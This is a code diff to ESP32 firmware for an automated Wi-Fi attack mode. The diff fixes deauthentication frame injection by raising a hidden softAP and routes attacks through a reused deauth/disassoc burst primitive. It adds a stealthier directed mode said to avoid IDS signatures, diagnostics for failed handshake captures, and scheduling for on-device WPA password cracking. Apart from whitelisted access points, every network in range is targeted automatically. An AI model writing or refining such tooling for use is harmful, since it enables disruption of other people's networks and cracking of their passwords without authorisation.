@@ -21,6 +21,7 @@
 #include "wifi_functions.h"
 #include "lockscreen_manager.h"
 #include "dot11.h"
+#include "deauth_functions.h"   // reuse the HW-verified deauth primitive (da/ws)
 #include "pcap_writer.h"
 #include "cap_parse.h"
 #include "wpa_crack.h"
@@ -58,7 +59,9 @@ static const uint8_t PWN_CHANS[]   = {1, 6, 11};
                                     // RIGHT NOW), hold this channel & keep kicking it to complete the 4-way
 #define PWN_HOT_MAX        30000    // ...but never camp one stubborn channel longer than this continuously
 #define PWN_MAX_TARGETS    64
-#define PWN_CRACK_SLICE_MS 500      // keep slices short so the UI stays responsive
+#define PWN_CRACK_SLICE_MS 300      // one crack BATCH (~a handful of candidates); short so the
+                                    // loop can re-scan the air between batches and bail to capture
+                                    // the instant a target appears (capture always > crack)
 #define PWN_RSSI_CUTOFF    (-80)
 #define PWN_RING           24
 #define PWN_FRAME_MAX      256
@@ -126,6 +129,11 @@ struct PwnCapBuf {
     bool     m1HasPmkid;
 };
 static PwnCapBuf s_cap;
+static uint8_t   s_apMac[6] = {0};   // our own hidden-softAP MAC — never target/attack it
+// diag counters (logged per-hop in ai_debug.log) — tell whether the deauth/capture
+// pipeline is firing AND landing: dD=directed bursts (client known), dB=broadcast bursts
+// (no client), txf=frames the driver rejected (!=ESP_OK), m1/m2=EAPOL frames observed.
+static uint32_t  s_dtxD = 0, s_dtxB = 0, s_txFail = 0, s_m1Seen = 0, s_m2Seen = 0;
 
 // ── helpers ───────────────────────────────────────────────────────────────────
 static void macStr(const uint8_t* m, char* out) {
@@ -274,6 +282,32 @@ static void cursorSet(const char* mac, const char* ssid, const String& wid, long
 // ── whitelist (cached in RAM for the session — hot path, no per-frame SD reads) ─
 static std::vector<String> s_wlBssid;   // whitelisted MAC strings
 static std::vector<String> s_wlSsid;    // whitelisted SSID names
+// Extract a canonical MAC "XX:XX:XX:XX:XX:XX" from a whitelist bssid row's value.
+// DELIBERATELY tolerant — the whitelist is an authorization-SAFETY feature, so a row that
+// silently fails to match (and thus ATTACKS a protected AP) is the worst outcome. Accepts
+// the canonical colon form AND the common hand-edit mistakes: comma/space/dash separators
+// (natural in a CSV) and missing leading zeros ("0"->00). Reads exactly 6 hex octets and
+// ignores any trailing label; returns "" if it can't get 6.
+static int wlHexNibble(char c) {
+    if (c >= '0' && c <= '9') return c - '0';
+    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
+    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
+    return -1;
+}
+static String wlNormalizeMac(const char* rest) {
+    uint8_t oct[6]; int n = 0;
+    for (const char* p = rest; *p && n < 6; ) {
+        while (*p && wlHexNibble(*p) < 0) p++;                          // skip separators
+        if (!*p) break;
+        int v = wlHexNibble(*p++);                                      // first nibble
+        if (*p && wlHexNibble(*p) >= 0) v = v * 16 + wlHexNibble(*p++); // optional second
+        oct[n++] = (uint8_t)v;
+    }
+    if (n != 6) return String("");
+    char out[18]; snprintf(out, sizeof(out), "%02X:%02X:%02X:%02X:%02X:%02X",
+                           oct[0], oct[1], oct[2], oct[3], oct[4], oct[5]);
+    return String(out);
+}
 static void whitelistLoad() {
     s_wlBssid.clear(); s_wlSsid.clear();
     File f = SD.open(PWN_F_WHITELIST, FILE_READ);
@@ -281,12 +315,19 @@ static void whitelistLoad() {
     while (f.available()) {
         String ln = f.readStringUntil('\n'); ln.trim();
         if (ln.length() == 0 || ln[0] == '#') continue;
-        int c1 = ln.indexOf(','), c2 = ln.indexOf(',', c1 + 1);
+        int c1 = ln.indexOf(',');
         if (c1 < 0) continue;
         String type = ln.substring(0, c1);
-        String val  = c2 < 0 ? ln.substring(c1 + 1) : ln.substring(c1 + 1, c2);
-        if (type == "bssid")     s_wlBssid.push_back(val);
-        else if (type == "ssid") s_wlSsid.push_back(val);
+        String rest = ln.substring(c1 + 1);
+        if (type == "bssid") {
+            String mac = wlNormalizeMac(rest.c_str());     // tolerant of : , - and no leading 0
+            if (mac.length()) s_wlBssid.push_back(mac);
+        } else if (type == "ssid") {
+            int c2 = rest.indexOf(',');                    // ssid,<name>[,label]
+            String name = (c2 < 0) ? rest : rest.substring(0, c2);
+            name.trim();
+            if (name.length()) s_wlSsid.push_back(name);
+        }
     }
     f.close();
 }
@@ -301,6 +342,9 @@ static bool whitelisted(const uint8_t* bssid, const char* ssid) {
 // returns: 1 hit, 0 no-hit-this-slice, -1 not crackable / already solved
 static std::vector<String> s_priorityDone;   // keys done this session (bssid|ssid)
 static std::vector<String> s_sessionCaps;     // .cap paths written this session (for [k] session-only)
+static std::vector<String> s_crackSkip;       // caps that returned -1 this session (solved / exhausted /
+                                              // unparseable) — don't re-open them, so a wordlist that has
+                                              // no password for a cap can't keep stealing time from hunting
 static int pwnCrackCap(const char* path, char* foundOut, size_t foundN, char* ssidOut, char* progOut) {
     if (progOut) progOut[0] = 0;
     capparse::CrackJob job; char err[64];
@@ -483,7 +527,7 @@ static void gridSendAdv(uint16_t pwned, uint16_t hs, uint16_t pmkid, uint16_t up
     memcpy(a.magic, "ANQG", 4); a.ver = 1; strncpy(a.name, s_gridName, 12);
     a.pwned = pwned; a.hs = hs; a.pmkid = pmkid; a.uptimeMin = upMin;
     uint8_t fr[80]; uint16_t n = gridBuildFrame(fr, a);
-    esp_wifi_80211_tx(WIFI_IF_STA, fr, n, false);
+    esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false);   // AP iface — see softAP note in runPwnSession
 }
 static bool gridPeerUpdate(const char* name, uint16_t pwned, uint16_t hs, int8_t rssi) {
     for (int i = 0; i < s_nPeer; i++)
@@ -562,9 +606,10 @@ static char drainOne(uint8_t curCh) {
     s_rTail = (s_rTail + 1) % PWN_RING;
 
     if (fr.kind == 0) {                                 // beacon → learn SSID
+        const uint8_t* b = fr.data + 10;                // beacon: SA/BSSID at +10/+16
+        if (memcmp(b, s_apMac, 6) == 0) return 0;       // our own hidden softAP → ignore
         char ssid[33] = {0};
         dot11::extractSSID(fr.data, fr.len, dot11::ST_BEACON, ssid, sizeof(ssid));
-        const uint8_t* b = fr.data + 10;                // beacon: SA/BSSID at +10/+16
         // Always track (even whitelisted) so we KNOW the SSID and can honour an
         // SSID-whitelist on this AP's handshakes; the wl flag blocks attack + capture.
         PwnTarget* t = targAdd(b, ssid, curCh, fr.rssi);
@@ -630,22 +675,15 @@ static char drainOne(uint8_t curCh) {
 }
 
 // ── deauth ────────────────────────────────────────────────────────────────────
-// client==nullptr → broadcast deauth (active). client set → DIRECTED deauth to that
-// one STA (stealth: far quieter, no broadcast-storm IDS signature).
-static void sendDeauth(const uint8_t* bssid, const uint8_t* client) {
-    uint8_t fr[26] = {
-        0xC0, 0x00, 0x00, 0x00,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // DA (broadcast or client)
-        0,0,0,0,0,0,                          // SA = bssid (filled)
-        0,0,0,0,0,0,                          // BSSID (filled)
-        0x00, 0x00,                           // seq
-        0x07, 0x00                            // reason
-    };
-    if (client) memcpy(fr + 4, client, 6);
-    memcpy(fr + 10, bssid, 6);
-    memcpy(fr + 16, bssid, 6);
-    // a burst — a single frame is easily missed; a few reliably kick the client
-    for (int i = 0; i < 4; i++) { esp_wifi_80211_tx(WIFI_IF_STA, fr, sizeof(fr), false); delayMicroseconds(600); }
+// Reuse the PROVEN DeauthAttack primitive (the same one da/ws use — HW-verified 100%)
+// rather than hand-rolling frames (rule 5b). It sends BOTH deauth (0xC0) and disassoc
+// (0xA0) with randomised seq, 3x each with proper gaps — far more reliable at kicking a
+// client than the old single-frame version. Injects on WIFI_IF_AP via the softAP brought
+// up in runPwnSession (bare STA-unassociated TX does not hit the air — the old bug).
+//   client==nullptr → broadcast burst (active).  client set → directed burst (quieter).
+static void sendDeauth(DeauthAttack& da, const uint8_t* bssid, const uint8_t* client) {
+    if (client) { s_dtxD++; s_txFail += da.sendDirectedBurst(bssid, client); }  // directed (client known)
+    else        { s_dtxB++; s_txFail += da.sendBroadcastBurst(bssid); }         // broadcast (no client)
 }
 
 // ── adaptive channel learner — `pwn ai` [EXP] ────────────────────────────────
@@ -766,7 +804,16 @@ static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, 
         int pct = totalW > 0 ? (int)(100.0f * w / totalW + 0.5f) : 0;
         f.printf("c%u[m%.2f p%02d]%c", ch, learnMean(ch), pct, ch == picked ? '*' : ' ');
     }
-    f.printf(" => c%-2u dwell=%lums\n", picked, (unsigned long)dwell);
+    // diag tail. Reading it when m1=0 (no captures):
+    //   dD=0 (all broadcast) → no client ever sat on a deauthable AP → clients are on weak
+    //        APs below the -80 cutoff (environment). Fix = PMKID solicit / lower cutoff.
+    //   dD>0 & txf>0        → the driver is REJECTING frames → real TX bug (softAP/channel).
+    //   dD>0 & txf=0 & m1=0 → directed deauth queued fine but no reconnect handshake → the
+    //        frame isn't landing on the victim's channel (softAP-vs-hop mismatch) or PMF.
+    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu txf=%lu m1=%lu m2=%lu ap=%d cli=%d\n",
+             picked, (unsigned long)dwell, (unsigned long)s_dtxD, (unsigned long)s_dtxB,
+             (unsigned long)s_txFail, (unsigned long)s_m1Seen, (unsigned long)s_m2Seen,
+             s_nTarg, s_nCli);
     f.close();
 }
 
@@ -882,11 +929,20 @@ static bool argHas(const char* a, const char* w) { return a && strstr(a, w); }
 static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     DisplayManager& dm = displayManager;
     s_nTarg = 0; s_nCli = 0; s_nPeer = 0; s_metName[0] = 0;
-    memset(&s_cap, 0, sizeof(s_cap)); s_priorityDone.clear(); s_sessionCaps.clear();
+    memset(&s_cap, 0, sizeof(s_cap)); s_priorityDone.clear(); s_sessionCaps.clear(); s_crackSkip.clear();
+    s_dtxD = s_dtxB = s_txFail = s_m1Seen = s_m2Seen = 0;   // reset per-session diag counters
     s_rHead = s_rTail = 0;
     whitelistLoad();   // cache whitelist once (hot path checks RAM, not SD)
 
-    WiFi.mode(WIFI_STA);
+    // The AP interface MUST be up for esp_wifi_80211_tx() to actually put deauth/grid
+    // frames on the air. Bare STA-unassociated TX (what pwn used to do) silently fails
+    // to transmit → clients never get kicked → NO handshake ever caught. This mirrors
+    // our proven ws/da/karma path (and Bruce/Marauder). Hidden SSID + 0 clients = a
+    // minimal tell; the roam loop sets the real channel via esp_wifi_set_channel() each
+    // hop, so the softAP "home" channel is cosmetic and gets overridden immediately.
+    WiFi.mode(WIFI_MODE_APSTA);
+    WiFi.softAP("x", nullptr, 1, 1, 0, false);   // ssid,pass,ch,hidden,maxconn,ftm
+    esp_wifi_get_mac(WIFI_IF_AP, s_apMac);        // so we can ignore our own AP's beacons
     esp_wifi_set_promiscuous(false);
     wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
     esp_wifi_set_promiscuous_filter(&filt);
@@ -894,6 +950,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
     esp_wifi_set_promiscuous(true);
     s_sniffing = true;
     gridInitIdentity();   // grid MAC + name (needs WiFi started for esp_wifi_get_mac)
+    DeauthAttack da(displayManager, wifiFunctions);   // proven deauth primitive (rule 5b)
 
     int nChans = fullChans ? 13 : (int)(sizeof(PWN_CHANS));
     int ci = 0;
@@ -993,7 +1050,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                     if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
                     const uint8_t* c = cliFor(s_targ[i].bssid);
                     if (pass == 0 && !c) continue;               // pass 0 needs a known client
-                    sendDeauth(s_targ[i].bssid, c);              // directed if client known, else broadcast
+                    sendDeauth(da, s_targ[i].bssid, c);          // directed if client known, else broadcast
                     focusIdx = i; attackRot = i + 1; reDeauthAt = now + 900;
                     break;                                        // one AP this dwell
                 }
@@ -1015,18 +1072,18 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         if (focusIdx >= 0 && focusIdx < s_nTarg && !midCapture && mode != PWN_PASSIVE &&
             !s_targ[focusIdx].captured && now >= reDeauthAt) {
             const uint8_t* c = cliFor(s_targ[focusIdx].bssid);
-            if (mode == PWN_STEALTH) { if (c) sendDeauth(s_targ[focusIdx].bssid, c); }
-            else sendDeauth(s_targ[focusIdx].bssid, c);   // directed if client known, else broadcast
+            if (mode == PWN_STEALTH) { if (c) sendDeauth(da, s_targ[focusIdx].bssid, c); }
+            else sendDeauth(da, s_targ[focusIdx].bssid, c);   // directed if client known, else broadcast
             reDeauthAt = now + 900;
         }
 
         // drain sniffed frames
         char ev = drainOne(curCh);
         if (ev == 'B') { apCount = s_nTarg; }
-        else if (ev == '1') { strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; curReward += 3.0f; // M1 = active client
+        else if (ev == '1') { s_m1Seen++; strcpy(mood, "HUNT"); lastMoodEvt = now; lastM1Ms = now; curReward += 3.0f; // M1 = active client
                               if (hotChan != curCh || now >= hotUntil) hotStart = now;   // start of a fresh hot period
                               hotChan = curCh; hotUntil = now + PWN_HOT_MS; }             // stay here & keep trying
-        else if (ev == '2') { strcpy(mood, "EXCITED"); lastMoodEvt = now; }
+        else if (ev == '2') { s_m2Seen++; strcpy(mood, "EXCITED"); lastMoodEvt = now; }
         else if (ev == 'G') { strcpy(mood, "SOCIAL"); lastMoodEvt = now;   // met a grid peer
                               snprintf(ticker, sizeof(ticker), "met %.12s", s_metName); }
 
@@ -1065,56 +1122,66 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         // revisited sparsely (full-13 roam) — 3s dropped handshakes that 1/6/11 caught.
         if (s_cap.active && (now - s_cap.startMs) > 6000) s_cap.active = false;
 
-        // idle → crack a cap for one slice (rotate past solved/exhausted caps).
-        // "Idle" = no handshake capture in progress AND not right after a deauth (so a
-        // triggered handshake still lands). Ambient beacons do NOT block cracking — that
-        // was the bug that kept it stuck on IDLE. Throttled so an exhausted backlog can't
-        // re-scan SD every loop.
-        // crack unless a handshake is genuinely in flight: only pause briefly (1.2s) after
-        // an actual M1 so its M2 can land. Deauth alone does NOT block cracking (a deauth
-        // with no reconnecting client produces no handshake), so a busy active-mode channel
-        // can't starve the cracker.
-        // CRACKING YIELDS TO THE HUNT (capture > crack): while there is un-captured prey in
-        // range we only TRICKLE-crack (one slice every 5s ≈ 10% CPU) so roaming/scouting stays
-        // snappy; when the area is quiet (nothing left to capture) we crack HARD (every 0.7s).
-        // Captures are always crackable later with `cc` / a PC, so nothing is lost by waiting.
+        // CRACK ONLY IN FREE TIME (capture is ALWAYS the priority). While there is any
+        // un-captured prey in range OR a capture in flight, do NOT crack — hunt. When the
+        // air is genuinely quiet, crack ONE short batch, then drop back to the loop to
+        // re-scan the air (drain + re-assess prey) before the next batch — so the instant a
+        // target appears we bail cracking and return to the deauth/capture main phase.
         int preyInRange = 0;
         for (int i = 0; i < s_nTarg; i++)
             if (!s_targ[i].captured && !s_targ[i].wl &&
                 (s_targ[i].rssi == 0 || s_targ[i].rssi >= PWN_RSSI_CUTOFF)) preyInRange++;
-        bool canCrack = (now - lastM1Ms) > 1200;
+        bool captureWork = (preyInRange > 0) || s_cap.active;       // something to hunt/finish
+        // free time + M1-settle guard + a startup warm-up: the first ~sweep is spent
+        // DISCOVERING the environment. Cracking pauses promiscuous, so we must actually
+        // listen before concluding "nothing to capture" — else a fresh session goes deaf on
+        // its backlog instead of finding the APs around it (12s ≈ one 1/6/11 sweep).
+        bool canCrack = !captureWork && (now - lastM1Ms) > 1200 && (now - t0Session) > 12000;
         if (canCrack && now >= crackAt) {
-            crackAt = now + (preyInRange > 0 ? 5000 : 700);   // trickle while hunting, hard when quiet
-            std::vector<String> caps;
-            if (backlog) {                                 // all caps on disk
-                File d = SD.open(SD_DIR_PWN);
-                if (d && d.isDirectory()) {
-                    for (File f = d.openNextFile(); f; f = d.openNextFile()) {
-                        if (!f.isDirectory()) {
-                            String nm = f.name(); String low = nm; low.toLowerCase();
-                            if (low.endsWith(".cap")) {
-                                int sl = nm.lastIndexOf('/');
-                                caps.push_back(SD_DIR_PWN "/" + (sl >= 0 ? nm.substring(sl + 1) : nm));
+            bool didWork = false;
+            {   // GDMA (fix #2): a crack batch reads the SD (dir list, .cap, wordlist) and
+                // needs no radio — pause the promiscuous RX firehose around it. The deaf
+                // window only happens when there's nothing worth hearing (we're idle).
+                ScopedPromiscPause _;
+                std::vector<String> caps;
+                if (backlog) {                                 // all caps on disk
+                    File d = SD.open(SD_DIR_PWN);
+                    if (d && d.isDirectory()) {
+                        for (File f = d.openNextFile(); f; f = d.openNextFile()) {
+                            if (!f.isDirectory()) {
+                                String nm = f.name(); String low = nm; low.toLowerCase();
+                                if (low.endsWith(".cap")) {
+                                    int sl = nm.lastIndexOf('/');
+                                    caps.push_back(SD_DIR_PWN "/" + (sl >= 0 ? nm.substring(sl + 1) : nm));
+                                }
                             }
+                            f.close();
                         }
-                        f.close();
                     }
+                    if (d) d.close();
+                } else {
+                    caps = s_sessionCaps;                      // [k] session-only: just this run's caps
                 }
-                if (d) d.close();
-            } else {
-                caps = s_sessionCaps;                      // [k] session-only: just this run's caps
+                for (auto& cp : caps) {                         // first cap that actually has work wins
+                    bool skip = false;                          // already solved/exhausted this session?
+                    for (auto& s : s_crackSkip) if (s == cp) { skip = true; break; }
+                    if (skip) continue;
+                    char found[64] = {0}, ss[33] = {0}, prog[16] = {0};
+                    int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog);
+                    if (r == -1) { s_crackSkip.push_back(cp); continue; }   // nothing more here — never retry
+                    didWork = true;
+                    if (r == 1) { pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
+                        snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found); }
+                    else { strcpy(mood, "CRACK");
+                        snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
+                    lastMoodEvt = now;
+                    break;                                      // one batch, then re-check the air
+                }
             }
-            for (auto& cp : caps) {                         // first cap that actually has work wins
-                char found[64] = {0}, ss[33] = {0}, prog[16] = {0};
-                int r = pwnCrackCap(cp.c_str(), found, sizeof(found), ss, prog);
-                if (r == -1) continue;                      // solved/exhausted/unparseable → next
-                if (r == 1) { pwnedCount++; strcpy(mood, "PWNED"); pwnFlash = now + 2500;
-                    snprintf(ticker, sizeof(ticker), "PWNED %.14s=%.10s", ss, found); }
-                else { strcpy(mood, "CRACK");
-                    snprintf(ticker, sizeof(ticker), "crack %.14s  %s", ss[0] ? ss : cp.c_str() + sizeof(SD_DIR_PWN), prog); }
-                lastMoodEvt = now;
-                break;
-            }
+            // Keep cracking back-to-back while there's progress (next iteration re-checks the
+            // air first); back off hard once the whole backlog is solved/exhausted so we don't
+            // re-scan the SD every loop (spin guard).
+            crackAt = now + (didWork ? 0 : 12000);
         }
 
         // resting mood after a quiet stretch: HUNT while un-captured prey is in range
@@ -1215,12 +1282,13 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         vTaskDelay(pdMS_TO_TICKS(5));
     }
 
-    // teardown (GDMA-safe): stop TX/promiscuous, leave WiFi STA-idle
+    // teardown (GDMA-safe): stop TX/promiscuous, drop the softAP, leave WiFi STA-idle
     s_sniffing = false;
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_promiscuous_rx_cb(nullptr);
-    if (s_aiOn) learnSave();   // persist the learned channel table (promiscuous now off)
+    WiFi.softAPdisconnect(true);
     WiFi.mode(WIFI_STA);
+    if (s_aiOn) learnSave();   // persist the learned channel table (radio fully idle now)
     if (haveSpr) phx.deleteSprite();
     dm.clearScreen();
     dm.printCommandScreen();
